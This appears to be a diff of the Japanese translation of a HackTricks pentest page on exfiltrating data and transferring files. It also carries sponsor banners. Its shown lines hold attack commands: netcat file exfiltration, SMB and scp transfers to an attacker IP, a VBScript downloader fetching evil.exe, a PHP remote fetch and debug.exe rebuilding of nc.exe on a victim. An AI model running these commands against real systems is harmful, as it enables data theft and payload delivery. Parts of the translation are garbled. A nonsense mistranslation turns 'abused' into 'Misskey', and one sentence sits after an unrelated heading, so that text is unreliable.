@@ -6,27 +6,27 @@
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する。
-* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) をフォローする**
+* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のgithubリポジトリに提出してください。**
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
+最も重要な脆弱性を見つけて、迅速に修正できるようにします。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
-## 情報を外部に持ち出すための一般的にホワイトリストに登録されているドメイン
+## 情報の外部への持ち出しによくホワイトリストされるドメイン
 
-Misskey で濫用される可能性のある一般的にホワイトリストに登録されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) をチェックしてください
+Misskey される可能性のある一般的なホワイトリストされたドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) をチェックしてください
 
-## Base64 をコピー＆ペースト
+## Base64 のコピー＆ペースト
 
 **Linux**
 ```bash
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて、より速く修正できるようにします。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
+最も重要な脆弱性を見つけて修正できるようにします。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -195,28 +195,21 @@ service smbd restart
 ```
 ## Exfiltration
 
-### Exfiltration Techniques
+### Exfiltration Over Command and Control Channel
 
-Exfiltration techniques are used to **steal** data from a target network. Once an attacker has gained access to a network, they will often need to exfiltrate data without being detected. There are several common exfiltration techniques:
+Exfiltration over the command and control (C2) channel is a common technique used by attackers to steal data from compromised systems. This method involves sending the exfiltrated data to a remote server controlled by the attacker. The data can be encrypted to avoid detection by security tools.
 
-- **Compression**: Data is compressed before exfiltration to reduce its size and avoid detection.
-- **Encryption**: Data is encrypted to prevent detection by security tools.
-- **Steganography**: Data is hidden within other files to avoid detection.
-- **Traffic manipulation**: Attackers manipulate network traffic to exfiltrate data without being detected.
-- **DNS tunneling**: Data is exfiltrated using DNS requests to avoid detection.
+### Exfiltration Over Alternative Protocols
 
-### Exfiltration Tools
+Attackers may also exfiltrate data using alternative protocols such as DNS, ICMP, or HTTPS. By disguising the exfiltrated data as legitimate traffic over these protocols, attackers can bypass network security measures.
 
-There are several tools available to help with data exfiltration:
+### Exfiltration Over Encrypted Channels
 
-- **Netcat**: A versatile networking utility that can be used for data transfer.
-- **Wget**: A command-line utility for downloading files.
-- **Curl**: Another command-line utility for transferring data with URLs.
-- **FTP**: File Transfer Protocol can be used to exfiltrate data to an external server.
-- **SCP**: Secure Copy Protocol can securely transfer files between hosts.
-- **Rsync**: A utility for efficiently transferring and synchronizing files between systems.
+Exfiltrating data over encrypted channels such as SSL/TLS can help attackers avoid detection by encrypting the exfiltrated data in transit. This method makes it harder for security tools to inspect the data being exfiltrated.
 
-By using these exfiltration techniques and tools, attackers can successfully steal data from a target network without being detected.
+### Exfiltration Using Steganography
+
+Steganography is the technique of hiding data within other files to avoid detection. Attackers can use steganography to exfiltrate data by embedding it within images, audio files, or other seemingly innocuous files. This method can be difficult to detect without specialized tools.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -232,7 +225,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントできます。
+被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントすることができます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -240,31 +233,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Data Exfiltration
-
-#### Description
-
-The `nc` command, short for netcat, is a versatile tool that can be used for data exfiltration. It allows for reading and writing data across network connections, making it a valuable asset during a penetration test.
-
-#### Usage
-
-To exfiltrate data using `nc`, you can set up a listener on the receiving end and send data from the target machine to the listener. Here is an example of how to send a file using `nc`:
-
-On the receiving end:
-```bash
-nc -lvp <PORT> > received_file
-```
-
-On the target machine:
-```bash
-nc <RECEIVING_IP> <PORT> < file_to_send
-```
-
-#### Considerations
-
-- Ensure that the port you choose is open and accessible.
-- Encrypt the data if necessary to prevent interception.
-- Be cautious when using `nc` as it can be detected by intrusion detection systems.
+NC（Netcat）は、ネットワーク通信を行うための便利なツールです。通常、NCはリバースシェルを作成するために使用され、攻撃者が外部のシステムにアクセスし、データを送信するのに役立ちます。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -313,7 +282,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 XPおよび2003ではデフォルトで有効（他のOSではインストール時に明示的に追加する必要がある）
 
-Kaliでは、**TFTPサーバーを起動**します：
+Kaliでは、**TFTPサーバーを起動**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -337,7 +306,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic Script (VBScript) は、Microsoft Windows 環境で広く使用されているスクリプト言語です。VBScript を使用して、ファイルをエクスフィルトレーションする方法の一例を以下に示します。
+Visual Basic Script（VBScript）は、Microsoft Windows環境で広く使用されているスクリプト言語です。VBScriptを使用して、ファイルやデータを外部に送信するためのスクリプトを作成することができます。VBScriptを使用したデータの外部送信は、機密情報の漏洩につながる可能性があるため、慎重に取り扱う必要があります。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -375,14 +344,10 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-これはWindows 32ビットマシンで機能するクレイジーなテクニックです。アイデアは`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されます。しかし、16進数から再構築することもできます。したがって、バイナリ（例：`netcat`）を16進数に分解し、それを侵害されたマシン上のファイルに貼り付け、`debug.exe`で組み立てるというアイデアです。
-
-`Debug.exe`は64 kbしか組み立てられません。そのため、それよりも小さいファイルを使用する必要があります。さらに圧縮するためにupxを使用できます。それでは、やってみましょう：
-```
+`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。つまり、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できます。ただし、`debug.exe`には**64 kbまでのファイルをアセンブリするという制限**があることに注意することが重要です。
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-今はたった29 kbしかありません。完璧です。では、これを分解してみましょう：
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
 ## DNS
@@ -391,21 +356,6 @@ wine exe2bat.exe nc.exe nc.txt
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。
+次に、テキストをWindowsシェルにコピーして貼り付け、nc.exeというファイルが作成されます。
 
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-
-<details>
-
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
-
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォローする。**
-* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
-
-</details>
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
